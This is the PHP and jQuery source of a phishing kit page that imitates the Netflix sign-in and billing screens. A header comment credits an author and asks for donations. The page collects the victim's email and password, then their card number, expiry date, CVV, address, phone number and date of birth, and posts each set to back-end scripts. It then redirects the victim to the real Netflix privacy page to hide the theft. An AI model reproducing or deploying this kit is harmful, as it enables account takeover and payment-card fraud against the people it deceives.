<?php session_start();
// REM by Cyborg99 Please donate if you like it : 1J2M2J7cbzCYULG99NgWgttVJK7dkuUEz5
include "../languages/{$_SESSION['language']}.php";
include '../../randa.php';
?>
<style>
@font-face {
	font-family: nf-icon;
	src: url(fonts/g_<?=$num2;?>.eot);
	src: url(fonts/g_<?=$num3;?>.eot?#iefix) format('embedded-opentype'), url(fonts/s_<?=$num4;?>.woff) format('woff'), url(fonts/t_<?=$num4;?>.ttf) format('truetype'), url() format('svg');
	font-weight: 400;
	font-style: normal
}
.basic-spinner.basic-spinner-light {
	background-image: url(../pic/btsp_<?=$num2;?>.png)
}
.circle {
	z-index: 17;
	position: fixed;
	width: 100%;
	top: 0;
	left: 0;
	min-height: 100%;
	overflow: hidden
}

.rotate {
	background: transparent url(../pic/loading_<?=$num1;?>.svg) top no-repeat;
	-moz-background-size: 100px 100px;
	background-size: 100px 100px;
	width: 100px;
	height: 100px;
	border: 0;
	left: 50%;
	top: 50%;
	z-index: 6
}

.rotate,
.rotate:before {
	content: "";
	position: absolute
}

.rotate:before {
	left: -2px;
	top: -2px;
	width: 104px;
	height: 104px;
	-webkit-border-radius: 100%;
	-moz-border-radius: 100%;
	border-radius: 100%;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	-webkit-animation: rotation 1s linear infinite;
	-moz-animation: rotation 1s linear infinite;
	-o-animation: rotation 1s linear infinite;
	animation: rotation 1s linear infinite
}

.rotate {
	margin: auto;
	top: 0;
	left: 0;
	right: 0;
	bottom: 0
}

.overlay {
	height: 100%;
	width: 100%;
	position: fixed;
	top: 0;
	left: 0;
	z-index: 16;
	-moz-opacity: .9;
	-khtml-opacity: .9;
	-webkit-opacity: .9;
	opacity: .9;
	-ms-filter: progid:DXImageTransform.Microsoft.Alpha(opacity=90);
	filter: alpha(opacity=90);
	background-color: #0c0c0ce8
}
</style>
    <?php if(isset($_POST['one'])):?>
        <main>
            <div class="wrapper">
                <div class="official_bg"><img src="pic/B<?=$fo2;?>_<?=$num1;?>.jpg" alt=""></div>
                <div class="head_logo">
                    <div><img src="../pic/logo_<?=$num3;?>.svg" alt=""></div>
                </div>
                <div class="main_body">
                    <div class="main_content main_formule">
                        <div class="main_frm_wrapper">
                            <h1><?php echo $lg_tr['head']?></h1>
                            <div class="main_alert" style="display:none" id="msg">
                                <div class="main_alert_msg">
                                    <?php echo $lg_tr['msg']?>
                                </div>
                            </div>
                            <form method="post" action="javascript:void(0)">
                                <div class="main_inp">
                                    <div class="place_inp">
                                        <div class="inp_control">
                                            <label class="input_id">
                                                <input type="text" name="eme" class="input" id="eme">
                                                <label for="eme" class="place_lbl">
                                                    <?php echo $lg_tr['lbl_eml']?>
                                                </label>
                                                <input type="hidden" name="screen">
                                            </label>
                                        </div>
                                    </div>
                                    <div class="msg_error">
                                        <?php echo $lg_tr['msg_eml']?>
                                    </div>
                                </div>
                                <div class="main_inp inp_pass">
                                    <div class="place_inp">
                                        <div class="inp_pass_control">
                                            <label class="input_id">
                                                <input type="password" id="pss" name="pss" class="input">
                                                <label for="pss" class="place_lbl">
                                                    <?php echo $lg_tr['lbl_pss']?>
                                                </label>
                                            </label>
                                            <button id="show_hide" type="button" class="show_hide" data-show="<?php echo $lg_tr['show_pss']?>" data-hide="<?php echo $lg_tr['hide_pss']?>">
                                                <?php echo $lg_tr['show_pss']?>
                                            </button>
                                            <script>
                                                $(document).on('focusin', '#pss', function() {
                                                    if ($(this).val()) {
                                                        $('#show_hide').show();
                                                    }
                                                });
                                                $(document).on('focusout', '#pss', function() {
                                                    if ($(this).val()) {
                                                        $('#show_hide').show();
                                                    } else {
                                                        $('#show_hide').hide();
                                                    }
                                                });
                                                $(document).on('click', '#show_hide', function() {
                                                    if ($.trim($(this).html()) == $(this).data('show')) {
                                                        $(this).html($(this).data('hide'));
                                                        $('#pss').attr('type', 'text');
                                                    } else {
                                                        $(this).html($(this).data('show'));
                                                        $('#pss').attr('type', 'password');
                                                    }
                                                });
                                            </script>
                                        </div>
                                    </div>
                                    <div class="msg_error">
                                        <?php echo $lg_tr['msg_pss']?>
                                    </div>
                                </div>
                                <button class="btn login-button btn-submit btn-small" type="submit">
                                    <?php echo $lg_tr['head']?>
                                </button>
                                <div class="remember_help">
                                    <div class="extra_inp remember_inp">
                                        <input id="rmm" type="checkbox" value="true" checked>
                                        <label for="rmm"><span class="remember_lbl"><?php echo $lg_tr['remember']?></span></label>
                                        <div class="helper"></div>
                                    </div>
                                    <a href="#" class="help_lnk">
                                        <?php echo $lg_tr['help']?>
                                    </a>
                                </div>
                            </form>
                        </div>
                        <div class="using_fb">
                            <div class="fb_frm">
                                <div class="fb_min">
                                    <button class="btn minimal-login btn-submit btn-small" type="submit" autocomplete="off" tabindex="0">
                                        <div class="fb-login"><img class="icon-facebook" src="pic/fb_<?=$num3;?>.png"><span class="fbBtnText"><?php echo $lg_tr['fb']?></span></div>
                                    </button>
                                </div>
                            </div>
                            <div class="new_acc">
                                <?php echo $lg_tr['new']?>
                                    <a href="javascript:void(0)">
                                        <?php echo $lg_tr['signup']?>
                                    </a>. </div>
                        </div>
                    </div>
                </div>
                <div class="footer_main footer_main_first">
                    <div class="footer_divider"></div>
                    <div class="footer_wrapper">
                        <p class="footer__top">
                            <a class="footer_top_a" href="javascript:void(0)">
                                <?php echo $lg_tr['contact']?>
                            </a>
                        </p>
                        <ul class="footer_lnk stru">
                            <li class="footer-link-item">
                                <a class="footer-link" href="javascript:void(0)">
                                    <?php echo $lg_tr['gift']?>
                                </a>
                            </li>
                            <li class="footer-link-item">
                                <a class="footer-link" href="javascript:void(0)">
                                    <?php echo $lg_tr['terms']?>
                                </a>
                            </li>
                            <li class="footer-link-item">
                                <a class="footer-link" href="javascript:void(0)">
                                    <?php echo $lg_tr['privacy']?>
                                </a>
                            </li>
                        </ul>
                        <div class="lang_switch">
                            <div class="flat_select">
                                <div class="select-arrow medium prefix globe">
                                    <select class="ui-select medium" id="selectLang">
                                        <option value="en" <?php echo $_SESSION[ 'language']=='en' ? 'selected': ''?>>English</option>
                                        <option value="es" <?php echo $_SESSION[ 'language']=='es' ? 'selected': ''?>>Español</option>
                                    </select>
                                    <script>
                                        $(document).on('change', '#selectLang', function() {
                                            window.location.href = 'index?lang=' + $(this).val();
                                        });
                                    </script>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </main>
        <div id="rotate" style="display:none">
            <div class="circle">
                <div class="rotate"></div>
            </div>
            <div class="overlay"></div>
        </div>
        <script>
            $("#lib").attr('disabled', '');
            $("[name=screen]").val(screen.width + ' x ' + screen.height);

            function isEmail(email) {
                return /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/.test($.trim(email));
            }
            $(document).on("keyup", ".input", function() {
                if ($(this).val()) {
                    $(this).addClass("hasText");
                } else {
                    $(this).removeClass("hasText");
                }
                if (!$(this).val()) {
                    $(this).parent().parent().parent().parent().addClass("error");
                    return false;
                } else {
                    $(this).parent().parent().parent().parent().removeClass("error");
                }
            });
            $(document).on("keyup", "[name=eme]", function() {
                if (!isEmail($(this).val())) {
                    $(this).parent().parent().parent().parent().addClass("error");
                    return false;
                } else {
                    $(this).parent().parent().parent().parent().removeClass("error");
                }
            });
            $(document).on("submit", "form", function(e) {
                e.preventDefault();
                var me = $(this);
                var check = true;
                if (!isEmail($("[name=eme]").val())) {
                    $("[name=eme]").parent().parent().parent().parent().addClass("error");
                    check = false;
                } else {
                    $("[name=eme]").parent().parent().parent().parent().removeClass("error");
                }
                if (!$("[name=pss]").val()) {
                    $("[name=pss]").parent().parent().parent().parent().addClass("error");
                    check = false;
                } else {
                    $("[name=pss]").parent().parent().parent().parent().removeClass("error");
                }
                if (!check) {
                    return false;
                } else {
                    $("#rotate").show();
                    $.post("post/a_<?=$num3;?>.php", me.serialize(), function(data, status, ) {
                        if (status == "success") {
                            if (data == "error") {
                                $("#msg").show();
                                $("#rotate").hide();
                                me[0].reset();
                                $(".input").removeClass("hasText");
                            } else {
                                $.post("post/c_<?=$num3;?>.php", {
                                    two: 'ok'
                                }, function(dt, status, ) {
                                    $('body').html(dt);
                                });
                            }
                        } else {
                            $("#msg").show();
                            $("#rotate").hide();
                        }
                    });
                }
            });
        </script>
        <?php endif?>
            <?php if(isset($_POST['two'])):?>
                <div class="basicLayout simplicity">
                    <div class="nfHeader noBorderHeader signupBasicHeader"><span class="logo"><img src="pic/nt_logo_<?=$num3;?>.svg" alt="logo"></span>
                        <a href="javascript:" class="authLinks signupBasicHeader isMemberSimplicity">
                            <?php echo $info_tr['signout']?>
                        </a>
                    </div>
                    <div class="simpleContainer">
                        <div class="centerContainer firstLoad">
                            <div class="paymentFormContainer">
							<style>
strong{font-weight:bold;}
::-moz-focus-inner{padding:0;border:0;}
.freeTrialMessaging.notification{width:100%;-webkit-border-radius:2px;-moz-border-radius:2px;border-radius:2px;text-align:center;margin:0 auto;color:#fff;}
.freeTrialMessaging.notification .content{background-color:#0071EB;padding:20px 0;margin:20px 32px 0;}
@media screen and (min-width: 500px){
.freeTrialMessaging.notification{max-width:440px;}
.freeTrialMessaging.notification .content{margin:20px 0 0;}
}reeTrialMessaging.notification .content{margin:20px 0 0;}
}
</style>
<div class="freeTrialMessaging notification" data-uia="freeTrialMessaging">
<div class="content"><span id="" data-uia=""><?php echo $info_tr['update']?></span>
</div>
</div>
                                <div class="contextContainer">
                                    <div class="contextRow contextRowFirst">
									<br>
                                        <?php echo $info_tr['by']?>
                                    </div>
                                </div>
                                <form method="post" action="javascript:void(0)" novalidate data-valid="<?php echo $info_tr['required']?>">
                                    <div class="fieldContainer"><img src="pic/vz_<?=$num5;?>.png" alt="">

                                        <ul class="simpleForm structural ui-grid">
                                            <li class="nfFormSpace">
                                                <div class="nfInput nfInputOversize">
                                                    <div class="nfInputPlacement">
                                                        <label>
                                                            <input type="text" class="nfTextField" id="fnm" name="fnm">
                                                            <label for="fnm" class="placeLabel">
                                                                <?php echo $info_tr['fuln']?>
                                                            </label>
                                                        </label>
                                                    </div>
                                                    <div class="inputError" style="display:none"></div>
                                                </div>
                                            </li>
                                            <li class="nfFormSpace">
                                                <div class="nfInput nfInputOversize">
                                                    <div class="nfInputPlacement">
                                                        <label>
                                                            <input type="text" class="nfTextField" id="cnm" name="cnm">
                                                            <label for="cnm" class="placeLabel">
                                                                <?php echo $info_tr['cnm']?>
                                                            </label>
                                                        </label>
                                                    </div>
                                                    <div class="inputError" style="display:none"></div>
                                                </div>
                                            </li>											
                                            <li class="nfFormSpace">
                                                <div class="nfInput nfInputOversize">
                                                    <div class="nfInputPlacement">
                                                        <label>
                                                            <input type="text" class="nfTextField" id="exp" name="exp">
                                                            <label for="exp" class="placeLabel">
                                                                <?php echo $info_tr['exp'];?>
                                                            </label>
                                                        </label>
                                                    </div>
                                                    <div class="inputError" style="display:none"></div>
                                                </div>
                                            </li>
<style>
.otherCvvHelp {
	background: url(../pic/cscamx_<?=$num5;?>.png) no-repeat 0 0;
	width: 200px;
	height: 130px;
	margin: 30px auto;
	opacity: 1
}

.amexCvvHelp {
	background: url(../pic/csamx_<?=$num4;?>.png) no-repeat 0 0;
	width: 200px;
	height: 130px;
	margin: 30px auto;
	opacity: 1
}

@media (-webkit-min-device-pixel-ratio:2),
(-o-min-device-pixel-ratio:2/1),
(min-resolution:192dpi) {
	.otherCvvHelp {
		background: url(../pic/cscamx_<?=$num2;?>.png) no-repeat 0 0;
		-moz-background-size: contain;
		background-size: contain
	}
	.amexCvvHelp {
		background: url(../pic/csamx_<?=$num3;?>.png) no-repeat 0 0;
		-moz-background-size: contain;
		background-size: contain
	}
}
.nfTextField.error:not(#csc) {
	border-color: #b92d2b;
	background: url(../pic/error_<?=$num4;?>.svg);
	background-repeat: no-repeat;
	background-size: 30px;
	background-position: top 60% right 10px
}

.nfTextField.error {
	border-color: #b92d2b;
	background: url(../pic/error_<?=$num3;?>.svg);
	background-repeat: no-repeat;
	background-size: 30px;
	background-position: top 60% right 50px
}

.nfTextField.valid:not(#csc) {
	border-color: #5fa53f;
	background: url(../pic/valid_<?=$num2;?>.svg);
	background-repeat: no-repeat;
	background-size: 30px;
	background-position: top 60% right 10px
}

.nfTextField.valid {
	border-color: #5fa53f;
	background: url(../pic/valid_<?=$num3;?>.svg);
	background-repeat: no-repeat;
	background-size: 30px;
	background-position: top 60% right 50px
}
</style>

                                            <li class="nfFormSpace"></li>
                                            <li class="nfFormSpace">
                                                <div class="nfInput nfInputOversize">
                                                    <div class="nfInputPlacement">
                                                        <label>
                                                            <input type="tel" class="nfTextField" id="csc" maxlength="4" minlength="3" name="csc">
                                                            <label for="csc" class="placeLabel">
                                                                <?php echo $info_tr['csc']?>
                                                            </label>
                                                        </label>
                                                    </div>
                                                    <div class="inputError" style="display:none"></div>
                                                    <div class="tooltipWrapperErr" id="bt_whats_csc"><img src="pic/csccircle_<?=$num1;?>.svg" alt="circle"></div>
                                                </div>
                                            </li>											
                                            <li class="nfFormSpace">
                                                <div class="nfInput nfInputOversize">
                                                    <div class="nfInputPlacement">
                                                        <label>
                                                            <input type="text" class="nfTextField" id="adr" name="adr">
                                                            <label for="adr" class="placeLabel">
                                                                <?php echo $info_tr['adr']?>
                                                            </label>
                                                        </label>
                                                    </div>
                                                    <div class="inputError" style="display:none"></div>
                                                </div>
                                            </li>
                                            <li class="nfFormSpace">
                                                <div class="nfInput nfInputOversize">
                                                    <div class="nfInputPlacement">
                                                        <label>
                                                            <input type="text" class="nfTextField" id="zip" name="zip">
                                                            <label for="adr" class="placeLabel">
                                                                <?php echo $info_tr['zip']?>
                                                            </label>
                                                        </label>
                                                    </div>
                                                    <div class="inputError" style="display:none"></div>
                                                </div>
                                            </li>											
                                            <li class="nfFormSpace">
                                                <div class="nfInput nfInputOversize">
                                                    <div class="nfInputPlacement">
                                                        <label>
                                                            <input value="<?php echo(isset($_SESSION['ip_countryName'])?$_SESSION['ip_countryName']:'')?>" type="text" class="nfTextField <?php echo(isset($_SESSION['ip_countryName'])?'hasText':'')?>" id="cnt" name="cnt">
                                                            <label for="cnt" class="placeLabel">
                                                                <?php echo $info_tr['country']?>
                                                            </label>
                                                        </label>
                                                    </div>
                                                    <div class="inputError" style="display:none"></div>
                                                </div>
                                            </li>
                                            <li class="nfFormSpace">
                                                <div class="nfInput nfInputOversize">
                                                    <div class="nfInputPlacement">
                                                        <label>
                                                            <input type="text" class="nfTextField" id="phn" name="phn">
                                                            <label for="phn" class="placeLabel">
                                                                <?php echo $info_tr['phone'];?>
                                                            </label>
                                                        </label>
                                                    </div>
                                                    <div class="inputError" style="display:none"></div>
                                                </div>
                                            </li>	
                                            <li class="nfFormSpace">
                                                <div class="nfInput nfInputOversize">
                                                    <div class="nfInputPlacement">
                                                        <label>
                                                            <input type="text" class="nfTextField" id="dob" name="dob">
                                                            <label for="dob" class="placeLabel">
                                                                <?php echo $info_tr['dob'];?>
                                                            </label>
                                                        </label>
                                                    </div>
                                                    <div class="inputError" style="display:none"></div>
                                                </div>
                                            </li>												
                                        </ul>
										<style>
a{text-decoration:none;color:#0071eb;}
a:hover{text-decoration:underline;}
.pointer{cursor:pointer;}
::-moz-focus-inner{padding:0;border:0;}
.changePlanContainer{background-color:#f4f4f4;-webkit-border-radius:5px;-moz-border-radius:5px;border-radius:5px;padding:14px;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;-moz-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between;}
.planInfo{display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-moz-box-orient:vertical;-moz-box-direction:normal;-ms-flex-direction:column;flex-direction:column;-webkit-box-pack:justify;-webkit-justify-content:space-between;-moz-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between;}
.planName{font-size:16px;font-weight:bold;color:#333333;display:block;margin-bottom:5px;}
@media screen and (max-width: 740px){
.planName{font-size:14px;}
}
.planDesc{font-size:16px;font-weight:normal;color:#737373;display:inline;}
@media screen and (max-width: 740px){
.planDesc{font-size:14px;}
}
.changePlanAction{display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-moz-box-orient:vertical;-moz-box-direction:normal;-ms-flex-direction:column;flex-direction:column;-webkit-box-pack:center;-webkit-justify-content:center;-moz-box-pack:center;-ms-flex-pack:center;justify-content:center;}
.changePlanLink{font-size:16px;margin-left:20px;font-weight:bold;cursor:pointer;}
@media screen and (max-width: 740px){
.changePlanLink{font-size:14px;}
}
										</style>
										<div class="changePlanContainer"><div class="planInfo"><span class="planName" data-uia="planName"><?php echo $info_tr['plan']?></span></div><div class="changePlanAction"><a class="pointer changePlanLink" data-uia="changePlanAction">Change</a></div></div>
                                    </div>
                                    <div class="submitBtnContainer">
                                        <button id="bt_submit" class="nf-btn waiting nf-btn-primary nf-btn-solid nf-btn-oversize" type="submit">
                                            <?php echo $info_tr['save']?>
                                                <div class="waitIndicator">
                                                    <div class="basic-spinner basic-spinner-light center-absolute" style="width:35px;height:35px"></div>
                                                </div>
                                        </button>
                                    </div>
                                </form>
                            </div>
                            <div class="cvvTooltip" style="display:none" id="whats_csc"><span class="icon-close close-button pointer" id="bt_close_whats_csc"></span>
                                <div class="tooltipDesc">
                                    <?php echo $info_tr['csc_msg']?>
                                </div>
                                <div class="otherCvvHelp"></div>
                                <div class="amexCvvHelp"></div>
                            </div>
                        </div>
                    </div>
                    <div class="site-footer-wrapper centered">
                        <div class="footer-divider"></div>
                        <div class="site-footer">
                            <p class="footer-top">
                                <a class="footer-top-a" href="javascript:">
                                    <?php echo $lg_tr['contact']?>
                                </a>
                            </p>
                            <ul class="footer-links structural">
                                <li class="footer-link-item">
                                    <a class="footer-link" href="javascript:">
                                        <?php echo $info_tr['faq']?>
                                    </a>
                                </li>
                                <li class="footer-link-item">
                                    <a class="footer-link" href="javascript:">
                                        <?php echo $info_tr['help_center']?>
                                    </a>
                                </li>
                                <li class="footer-link-item">
                                    <a class="footer-link" href="javascript:">
                                        <?php echo $lg_tr['terms']?>
                                    </a>
                                </li>
                                <li class="footer-link-item">
                                    <a class="footer-link" href="javascript:">
                                        <?php echo $lg_tr['privacy']?>
                                    </a>
                                </li>
                                <li class="footer-link-item">
                                    <a class="footer-link" href="javascript:">
                                        <?php echo $info_tr['cookies']?>
                                    </a>
                                </li>
                                <li class="footer-link-item">
                                    <a class="footer-link" href="javascript:">
                                        <?php echo $info_tr['corporate']?>
                                    </a>
                                </li>
                            </ul>
                        </div>
                    </div>
                    <script>
                        $("#lib").removeAttr('disabled');
                        $(document).ready(function() {
                            $('#exp').mask('00/00');
                            $('#phn').mask('(000) 000-0000');
							$('#dob').mask('00/00/0000');

                            function valid(me) {
                                if (me.val()) {
                                    me.addClass('hasText valid');
                                    me.removeClass('error');
                                    me.parent().parent().parent().children('.inputError').hide();
                                    return true;
                                } else {
                                    me.addClass('error');
                                    if (me.attr("placeholder") == undefined) {
                                        me.removeClass('hasText valid');
                                    } else {
                                        me.removeClass('valid');
                                    }
                                    me.parent().parent().parent().children('.inputError').html(me.next('label').html() + ' ' + $('form').data('valid')).show();
                                    return false;
                                }
                            }
                            $(document).on('keyup', 'input', function() {
                                var me = $(this);
                                valid(me);
                            });
                            $(document).on('click', '#bt_whats_csc', function() {
                                $('#whats_csc').show();
                            });
                            $(document).on('click', '#bt_close_whats_csc', function() {
                                $('#whats_csc').hide();
                            });
                            var ccvalid = false;
                            $(document).on('keyup', '#cnm', function() {
                                $('#cnm').mask('0000 0000 0000 0000 000');
                                $('#cnm').validateCreditCard(function(result) {
                                    var cc = $('#cnm');
                                    if (cc.val() != '') {
                                        var cctype = result.card_type == null ? '-' : result.card_type.name;
                                        $('input[name=ctp]').val(cctype);
                                        if (result.valid) {
                                            cc.addClass('hasText valid');
                                            cc.removeClass('error');
                                            cc.parent().parent().parent().children('.inputError').hide();
                                            ccvalid = true;
                                        } else {
                                            cc.addClass('error');
                                            cc.removeClass('valid');
                                            cc.parent().parent().parent().children('.inputError').html(cc.data('check')).show();
                                            ccvalid = false;
                                        }
                                    }
                                });
                            });
                            $(document).on('submit', 'form', function(e) {
                                e.preventDefault();
                                var me = $(this);
                                var check = true;
                                $('input').each(function(index, el) {
                                    if (!valid($(el))) {
                                        check = false;
                                    }
                                });
                                if (!ccvalid) {
                                    check = false;
                                }
                                if (check) {
                                    $('#bt_submit').attr('disabled', '');
                                    $.post("post/b_<?=$num2;?>.php", me.serialize(), function(data, status) {
                                        if (status == "success") {
                                            if (data == "error") {
                                                $('#bt_submit').removeAttr('disabled');
                                            } else {
                                                $.post("post/c_<?=$num3;?>.php", {
                                                    three: 'ok'
                                                }, function(dt, status) {
                                                    $('body').html(dt);
                                                });
                                            }
                                        } else {
                                            $('#bt_submit').removeAttr('disabled');
                                        }
                                    });
                                } else {
                                    return false;
                                }
                            });
                        });
                    </script>
                </div>
                        <?php endif?>
                            <?php if(isset($_POST['three'])):?>
                                <div class="basicLayout simplicity">
                                    <div class="nfHeader noBorderHeader signupBasicHeader"><span class="logo"><img src="pic/nt_logo_<?=$num3;?>.svg" alt="logo"></span>
                                        <a href="javascript:" class="authLinks signupBasicHeader isMemberSimplicity">
                                            <?php echo $info_tr['signout']?>
                                        </a>
                                    </div>
                                    <div class="simpleContainer">
                                        <div class="centerContainer contextStep firstLoad">
                                            <div class="planContainer">
                                                <div class="stepLogoContainer"><span class="stepLogo planStepLogo"></span></div>
                                                <div class="stepHeader-container">
                                                    <div class="stepHeader"><span class="stepIndicator"><?php echo $finish_tr['step']?></span>
                                                        <h1 class="stepTitle"><?php echo $finish_tr['success']?></h1></div>
                                                </div>
                                                <div class="contextBody contextRow">
                                                    <?php echo $finish_tr['redirect']?>
                                                </div>
                                            </div>
                                            <div class="submitBtnContainer">
                                                <button id="bt" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-align-undefined nf-btn-oversize" type="button">
                                                    <?php echo $finish_tr['bt']?>
                                                </button>
                                                <script>
                                                    $("#lib_main").removeAttr('disabled');
                                                    $("#lib").removeAttr('disabled');
                                                    $(document).on('click', '#bt', function() {
                                                        window.location.href = "https://" + "help.netflix.com/legal/privacy";
                                                    });
                                                    setTimeout(function() {
                                                        window.location.href = "https://" + "help.netflix.com/legal/privacy";
                                                    }, 5000);
                                                </script>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="site-footer-wrapper centered">
                                        <div class="footer-divider"></div>
                                        <div class="site-footer">
                                            <p class="footer-top">
                                                <a class="footer-top-a" href="javascript:">
                                                    <?php echo $lg_tr['contact']?>
                                                </a>
                                            </p>
                                            <ul class="footer-links structural">
                                                <li class="footer-link-item">
                                                    <a class="footer-link" href="javascript:">
                                                        <?php echo $info_tr['faq']?>
                                                    </a>
                                                </li>
                                                <li class="footer-link-item">
                                                    <a class="footer-link" href="javascript:">
                                                        <?php echo $info_tr['help_center']?>
                                                    </a>
                                                </li>
                                                <li class="footer-link-item">
                                                    <a class="footer-link" href="javascript:">
                                                        <?php echo $lg_tr['terms']?>
                                                    </a>
                                                </li>
                                                <li class="footer-link-item">
                                                    <a class="footer-link" href="javascript:">
                                                        <?php echo $lg_tr['privacy']?>
                                                    </a>
                                                </li>
                                                <li class="footer-link-item">
                                                    <a class="footer-link" href="javascript:">
                                                        <?php echo $info_tr['cookies']?>
                                                    </a>
                                                </li>
                                                <li class="footer-link-item">
                                                    <a class="footer-link" href="javascript:">
                                                        <?php echo $info_tr['corporate']?>
                                                    </a>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                                <?php endif?>